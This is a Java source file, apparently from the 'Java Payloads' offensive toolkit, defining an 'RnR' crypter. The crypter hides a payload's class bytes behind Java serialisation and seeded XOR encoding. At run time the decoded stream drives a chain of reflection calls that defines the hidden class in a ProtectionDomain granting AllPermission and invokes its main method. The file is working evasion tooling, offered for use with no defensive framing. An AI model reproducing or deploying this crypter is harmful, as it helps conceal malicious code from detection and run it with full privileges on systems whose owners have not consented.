/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.crypter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.PermissionCollection;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Random;

public class RnR extends TemplateBasedCrypter {

	public RnR() {
		super("Reflection and Randomization", "");
	}

	protected byte[] generateReplaceData(String className, byte[] innerClassBytes, long seed) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);

		// line 2
		oos.writeObject(new Object[] { null, new Object[] { null, innerClassBytes, new Integer(0), new Integer(innerClassBytes.length), null } });

		// line 3
		oos.writeUTF("java.net.URLClassLoader");
		oos.writeObject(new Class[] { URL[].class });
		oos.writeObject(new Object[] { new URL[0] });

		// line 4
		oos.writeUTF("java.security.ProtectionDomain");
		oos.writeObject(new Class[] { CodeSource.class, PermissionCollection.class });
		final Permissions permissions = new Permissions();
		permissions.add(new AllPermission());
		oos.writeObject(new Object[] { new CodeSource(new URL("file:///"), new Certificate[0]), permissions });

		// line 5
		oos.writeUTF("java.lang.ClassLoader");

		// line 6
		oos.writeUTF("java.lang.Class");
		oos.writeUTF("getDeclaredMethod");
		oos.writeObject(new Class[] { String.class, Class[].class });
		oos.writeObject(new Object[] { "defineClass", new Class[] { String.class, byte[].class, int.class, int.class, ProtectionDomain.class } });

		// line 7
		oos.writeUTF("java.lang.reflect.Method");
		oos.writeUTF("setAccessible");
		oos.writeObject(new Class[] { boolean.class });
		oos.writeObject(new Object[] { Boolean.TRUE });

		// line 8
		oos.writeUTF("java.lang.reflect.Method");
		oos.writeUTF("invoke");
		oos.writeObject(new Class[] { Object.class, Object[].class });

		// line 9
		oos.writeUTF("main");
		oos.writeObject(new Class[] { String[].class });

		oos.close();
		byte[] result = baos.toByteArray();
		Random r = new Random(seed);
		for (int i = 0; i < result.length; i++) {
			result[i] ^= r.nextInt(256);
		}
		return result;
	}

	public static void templateMain(String[] args) throws Exception {
		byte[] data = "TO_BE_REPLACED".getBytes("ISO-8859-1");
		Random r = new Random(4242L);
		for (int i = 0; i < data.length; i++) {
			data[i] ^= r.nextInt(256);
		}
		// line 1:
		ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(data));
		Object[] arx = (Object[]) in.readObject();
		arx[0] = Class.forName(in.readUTF()).getConstructor((Class[]) in.readObject()).newInstance((Object[]) in.readObject());
		((Object[]) arx[1])[4] = Class.forName(in.readUTF()).getConstructor((Class[]) in.readObject()).newInstance((Object[]) in.readObject());
		Object _ClassLoader = Class.forName(in.readUTF());
		// line 6:
		Object mm = Class.forName(in.readUTF()).getMethod(in.readUTF(), (Class[]) in.readObject()).invoke(_ClassLoader, (Object[]) in.readObject());
		Class.forName(in.readUTF()).getMethod(in.readUTF(), (Class[]) in.readObject()).invoke(mm, (Object[]) in.readObject());
		Class clazz = (Class) Class.forName(in.readUTF()).getMethod(in.readUTF(), (Class[]) in.readObject()).invoke(mm, arx);
		clazz.getMethod(in.readUTF(), (Class[]) in.readObject()).invoke(null, new Object[] { args });
	}
}
